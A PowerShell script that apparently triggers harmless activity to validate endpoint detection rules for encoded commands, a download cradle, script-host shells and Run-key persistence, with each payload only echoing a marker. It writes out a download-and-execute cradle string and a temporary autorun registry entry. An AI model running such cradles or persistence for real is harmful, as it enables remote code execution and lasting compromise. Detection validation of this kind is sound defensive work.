[CmdletBinding()]
param(
    [ValidateSet('encoded-command', 'decoded-cradle', 'script-host-shell', 'run-key-persistence', 'all')]
    [string]$Scenario = 'all'
)

# Triggers benign activity that the AEGIS detection rules are written to match, so each
# rule can be validated against real telemetry instead of fixtures alone.
#
# SAFETY: every action here is harmless and self-cleaning. Payloads only echo a marker
# id, the registry value is written under HKCU and removed in the same run, and nothing
# is downloaded, no security control is changed, and no persistence survives the script.
# This is detection validation, not attack emulation; an approved Atomic Red Team run is
# a separate, separately authorised activity.

$ErrorActionPreference = 'Stop'

$workDirectory = 'C:\AEGIS\scenarios'
New-Item -ItemType Directory -Force -Path $workDirectory | Out-Null

$results = [System.Collections.Generic.List[object]]::new()

function New-MarkerId {
    'AEGIS-{0}-{1}' -f `
        [DateTime]::UtcNow.ToString('yyyyMMddTHHmmssfffZ'), `
        [Guid]::NewGuid().ToString('N').Substring(0, 8)
}

function Invoke-Scenario {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][string]$RuleId,
        [Parameter(Mandatory = $true)][string]$TechniqueId,
        [Parameter(Mandatory = $true)][scriptblock]$Action
    )

    $markerId = New-MarkerId
    $startUtc = [DateTime]::UtcNow

    try {
        & $Action $markerId
        $status = 'ok'
        $detail = ''
    }
    catch {
        $status = 'failed'
        $detail = $_.Exception.Message
    }

    # A second of slack on each side keeps the source event inside the window even when
    # Sysmon writes the event slightly after the process actually started.
    $endUtc = [DateTime]::UtcNow.AddSeconds(1)

    $results.Add([pscustomobject]@{
        scenario     = $Name
        rule_id      = $RuleId
        technique_id = $TechniqueId
        marker_id    = $markerId
        start_utc    = $startUtc.AddSeconds(-1).ToString('o')
        end_utc      = $endUtc.ToString('o')
        status       = $status
        detail       = $detail
    }) | Out-Null

    $colour = if ($status -eq 'ok') { 'Green' } else { 'Red' }
    Write-Host ("{0,-22} {1,-8} {2}" -f $Name, $status, $markerId) -ForegroundColor $colour
    if ($detail) { Write-Host "   $detail" -ForegroundColor Red }
}

# --- T1059.001: encoded PowerShell command -------------------------------------------
if ($Scenario -in 'encoded-command', 'all') {
    Invoke-Scenario -Name 'encoded-command' -RuleId '1131fb39-a497-4a09-b051-4e4c89066f5f' -TechniqueId 'T1059.001' -Action {
        param($markerId)
        $payload = "Write-Output '$markerId'"
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
        & powershell.exe -NoProfile -EncodedCommand $encoded | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "encoded command exited $LASTEXITCODE" }
    }
}

# --- T1059.001 / T1027: encoded download cradle ---------------------------------------
if ($Scenario -in 'decoded-cradle', 'all') {
    Invoke-Scenario -Name 'decoded-cradle' -RuleId '8c1d2f4a-5b6e-47c8-9a03-2e7f81d4b6c5' -TechniqueId 'T1027' -Action {
        param($markerId)

        # The cradle text is only ever assigned to a variable and printed. Nothing is
        # downloaded and nothing is executed, so this produces the telemetry a download
        # cradle would produce without performing the technique. Validating a detection
        # is not the same activity as running the attack, and this scenario stays firmly
        # on the validation side of that line.
        # Built as one flat single-quoted string. Nesting quotes inside the payload is
        # what broke the first attempt, and the payload has to stay valid PowerShell
        # because it is genuinely executed - it just has nothing to execute but an echo.
        $payload = 'Write-Output "' + $markerId +
            ' :: IEX (New-Object Net.WebClient).DownloadString(http://192.168.56.1/' + $markerId + ')"'
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        & powershell.exe -NoProfile -EncodedCommand $encoded | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "encoded cradle probe exited $LASTEXITCODE" }
    }
}

# --- T1059.005 / T1218.005: script host spawning a shell ------------------------------
if ($Scenario -in 'script-host-shell', 'all') {
    Invoke-Scenario -Name 'script-host-shell' -RuleId 'a41ef4b6-efa6-42c0-80d6-3d4ccd1b2aa9' -TechniqueId 'T1059.005' -Action {
        param($markerId)
        $vbsPath = Join-Path $workDirectory "$markerId.vbs"
        $vbsBody = @(
            'Set shell = CreateObject("WScript.Shell")'
            ('shell.Run "powershell.exe -NoProfile -Command Write-Output ''{0}''", 0, True' -f $markerId)
        )
        Set-Content -LiteralPath $vbsPath -Value $vbsBody -Encoding ASCII

        & "$env:SystemRoot\System32\wscript.exe" //B //NoLogo $vbsPath
        if ($LASTEXITCODE -ne 0) { throw "wscript exited $LASTEXITCODE" }

        Start-Sleep -Seconds 2
        [IO.File]::Delete($vbsPath)
    }
}

# --- T1547.001: Run key persistence ---------------------------------------------------
if ($Scenario -in 'run-key-persistence', 'all') {
    Invoke-Scenario -Name 'run-key-persistence' -RuleId '0630c267-9ba0-40b2-95d9-670996d404c8' -TechniqueId 'T1547.001' -Action {
        param($markerId)
        $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        $valueName = "AEGIS-$markerId"

        # Written under HKCU and removed immediately, so no autorun entry survives.
        New-ItemProperty -Path $runKey -Name $valueName -Value "cmd.exe /c echo $markerId" -PropertyType String -Force | Out-Null
        Start-Sleep -Seconds 2
        Remove-ItemProperty -Path $runKey -Name $valueName -ErrorAction SilentlyContinue

        if (Get-ItemProperty -Path $runKey -Name $valueName -ErrorAction SilentlyContinue) {
            throw 'run key value could not be removed'
        }
    }
}

Write-Host ''
Write-Host '--- machine readable results ---'
$results | ConvertTo-Json -Depth 5 -Compress

$failed = @($results | Where-Object { $_.status -ne 'ok' }).Count
exit $(if ($failed -gt 0) { 1 } else { 0 })
